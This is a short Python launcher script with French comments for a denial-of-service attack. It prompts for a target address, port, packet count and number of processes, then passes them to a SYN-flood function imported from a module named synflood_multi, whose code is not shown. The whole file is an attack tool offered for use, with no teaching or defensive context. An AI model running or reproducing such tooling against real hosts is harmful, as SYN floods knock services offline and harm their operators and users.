from modules.synflood_multi import ENVOIS

def main():
    # Demander à l'utilisateur les informations nécessaires
    cible = input("Adresse cible : ")
    port = int(input("Port : "))
    nbrpaquet = int(input("Nombre de paquets : "))
    nbr_processus = int(input("Nombre de processus : "))

    # Appeler la fonction syn de la classe ENVOIS avec les paramètres fournis par l'utilisateur
    ENVOIS.syn(cible, port, nbrpaquet, nbr_processus)

if __name__ == "__main__":
    main()
